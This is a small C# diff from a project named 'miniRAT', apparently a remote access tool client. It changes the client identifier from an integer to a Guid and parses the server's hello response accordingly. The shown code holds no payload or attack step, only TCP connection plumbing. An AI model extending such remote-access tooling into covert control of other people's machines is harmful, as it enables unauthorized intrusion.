@@ -15,7 +15,7 @@ namespace miniRAT
     {
         //must be same in client and server
         const string separator = "|||";
-        static int clientID = -1;
+        static Guid clientID = Guid.Empty;
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
 
@@ -109,7 +109,7 @@ namespace miniRAT
                 if (helloArray.Length < 2)//error in hello response 
                     throw new Exception("Error in hello response");
 
-                clientID = int.Parse(helloArray[0]);
+                clientID = Guid.Parse(helloArray[0].ToString());
                 Console.WriteLine("Connected to server id= " + clientID.ToString());
             }
             catch  (Exception ex)
